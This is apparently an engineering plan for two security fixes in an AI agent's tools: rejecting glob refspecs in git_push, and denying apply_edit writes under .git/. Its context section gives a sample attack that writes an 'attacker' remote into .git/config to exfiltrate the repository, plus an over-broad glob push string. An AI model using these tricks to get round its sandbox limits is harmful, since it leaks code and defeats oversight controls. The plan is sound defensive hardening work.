# P6.9 — senior plan: two git_push / apply_edit security follow-ons (#110 + #109)

## 1. Context

Two **independent** security vectors carried out of P6.5's cross-family review, both ratified by the architect (brief §Ratification, 2026-06-15). They share no file and have no ordering dependency → **two atoms, two commits.**

- **P6.9-110 (#110, ROUTINE):** `git_push`'s branch validation rejects `-`/`:`/`+` prefixes and banned flags, but a **glob refspec** `branch="refs/heads/*:refs/heads/*"` (no `:`/`+` prefix) slips through → `git push origin refs/heads/*:refs/heads/*` pushes **every** local branch. Low-severity (no `+` ⇒ non-fast-forward rejected; git_push is rev-1 ⇒ HARD ⇒ always human-confirmed with the visually-obvious glob surfaced) but a real over-broad-push gap. The existing `:`/`+` guard message also over-claims ("only plain branch names are accepted") when simple `src:dst` (`main:other`) actually passes. ADR-036 D3-iii input-validation surface — **no contract touch** (P6.5 routing already ruled this family routine).

- **P6.9-109 (#109, architect call (a)):** `apply_edit`'s only path restriction is `_check_path`, which rejects **escapes only** — `.git/config` is in-root ⇒ **currently writable**. Combined with P6.5-G1 (git_push restricted to *configured* remotes, resolved by reading `.git/config`), an in-sandbox `apply_edit(".git/config", "[remote \"x\"]\n  url = https://attacker/r")` makes `x` a "configured" remote → reopens repo-exfil. Architect ratified direction **(a): apply_edit denies any write under `.git/`** — fixes the **cause** (the write), broader-spectrum than the remote-symptom (also closes `.git/hooks/`, etc.), zero legitimate-use cost (git porcelain owns `.git/`; the agent edits workspace files). This **narrows apply_edit's documented containment contract** → **ADR-036 D3-i amendment in place** (the contract gains its first in-root denylist carve-out: "contained-in-root ⇒ writable, *except* control-plane `.git/`") + **t11 constitutional-test update**.

## 2. Tasks

### P6.9-110 — git_push: reject glob (`*`) refspec + fix the guard message

- **What:** Add a `*`-rejection to `git_push`'s branch validation and correct the over-claiming `:`/`+` guard message so it accurately describes what is rejected (prefixes `:` delete / `+` force **and** `*` glob) and what is accepted (plain names + simple `src:dst`).
- **Where:** `src/orchestrator/tools/subprocess_tools.py:433-437` (the existing `:`/`+` guard block) — add the `*` check here, and reword the message. Tests: `tests/tools/test_subprocess_tools.py` (new cases) + extend `t12` in `tests/tools/test_constitution.py:1046-1098`.
- **Why:** ADR-036 D3-iii input-validation surface (same family as the P6.5-shipped `:`/`+` rejection). Architect ratification: "reject `branch` containing `*` (glob) → `LocalToolError`; keep plain names (`main`) + simple `src:dst` (`main:other`)." No contract touch — routine.
- **Acceptance criteria:**
  - `branch` containing `*` anywhere → `LocalToolError` (covers `refs/heads/*:refs/heads/*`, `refs/heads/*`, `main:*`, `*`).
  - `branch="main"` (plain) → **still accepted** (passes validation; not over-blocked).
  - `branch="main:other"` (simple `src:dst`, no `:`/`+` prefix, no `*`) → **still accepted**.
  - The reworded `:`/`+`/`*` guard message accurately states: `:`-delete / `+`-force prefixes **and** `*` glob refspecs are rejected; plain branch names and simple `src:dst` are accepted. (No longer claims "only plain branch names".)
  - `t12` extended: assert `branch="refs/heads/*:refs/heads/*"` → `LocalToolError`, and `branch="main:other"` → does **not** raise on the glob/prefix guard. Add an assertion on the reworded message substring (in `test_subprocess_tools.py` or `t12`).
  - **fail-on-revert:** removing the `*` check makes the glob assertion fail; the `main:other` accept-case stays green (guards the no-over-block invariant).
- **Out of scope:** Constraining `src:dst` beyond glob-rejection (simple `src:dst` stays accepted per ratification); any `remote`-side change; the P6.5-shipped `:`/`+`/banned-flag/configured-remote checks (leave intact — only add `*` + reword).

### P6.9-109 — apply_edit: deny any write under `.git/` + ADR-036 D3-i amendment + t11

- **What:** Add a containment check to `apply_edit` that rejects any destination path resolving under the repo's `.git/` control-plane directory → `LocalToolError`; amend ADR-036 D3-i in place to inscribe the carve-out; update t11 to assert `.git/`-deny.
- **Where:** `src/orchestrator/tools/mutation_tools.py` — in `_apply_edit`, **after** `dest = _check_path(path_str, resolved_root)` (`:166`) and **before** the write (`:168`). ADR: `docs/decisions/ADR-036-mutation-local-tools.md` D3 §`**(i)`** (`:56-63`) + residuals table (`:138`). Test: `t11` in `tests/tools/test_constitution.py:910-1040`.
- **Why:** ADR-036 D3-i containment contract. Architect call (a): "deny scope = `.git/` only" (not speculative `.hg`/`.svn` — this repo is git; YAGNI, trivially generalizable later). Fixes the config-poisoning **cause** and any other `.git/` poisoning. Closes the #109 vector inscribed at ADR-036 D3-iii `:75`.
- **Acceptance criteria:**
  - The deny check is **apply_edit-local** (in `_apply_edit`), **NOT** inside `_check_path` — `_check_path` is shared with read tools (`read_file`/`list_files`); reading `.git/` is harmless, only the **write** is the poison vector. Do not change `_check_path`'s read-tool behavior.
  - Check against the **resolved** `dest` (post-`_check_path`, symlinks already followed): reject when `dest.relative_to(resolved_root).parts` is non-empty and `parts[0] == ".git"`. This denies both `.git` itself and anything under it, and (because `dest` is resolved) an in-sandbox symlink pointing into `.git/` too.
  - `apply_edit({"path": ".git/config", ...})` → `LocalToolError`, and the file is **unchanged** (no temp written, no partial — the check precedes the write).
  - `apply_edit({"path": ".git/hooks/pre-push", ...})` → `LocalToolError` (whole-`.git/` deny, not just `config`).
  - A normal in-root workspace write (e.g. `src/x.py`, `notes.txt`) → **still succeeds** (deny not over-broad).
  - **ADR-036 D3-i amendment (in place):** add a bullet/clause to the D3 §`**(i)`** block stating the containment contract now carries its first in-root denylist carve-out — "contained-in-root ⇒ writable, **except** the control-plane `.git/` directory (config-poisoning / `.git/hooks` defense; #109)" — with a `[Annotated P6.9 …]` marker matching the existing annotation style (cf. the P6.5/P4.3 annotations at `:75`/`:138`). Also annotate the residuals table row at `:138` if it aids traceability. Do **not** renumber or restructure D3-i; amend in place.
  - **t11 update:** add a behavioral assertion that `apply_edit(path=".git/config", …)` → `LocalToolError` + the would-be target is not created, and `apply_edit(path=".git/hooks/pre-push", …)` → `LocalToolError`; keep a normal-write success case so the deny is proven non-over-broad. (The existing escape/oversize/atomic assertions stay.)
  - **fail-on-revert:** reverting the `.git/`-deny check makes the t11 `.git/config` + `.git/hooks` assertions fail; the normal-write success case stays green.
- **Out of scope:** `.hg`/`.svn` or any other VCS control dir (ratified `.git/`-only); an operator-configurable in-root denylist (ratified YAGNI); case-insensitive-FS `.GIT` handling (out of scope — the deny matches the literal resolved component `.git`, sufficient for the threat model; note as a residual if you wish, do not implement); any git_push change (that is #110); the deferred P4.3 egress hard-boundary.
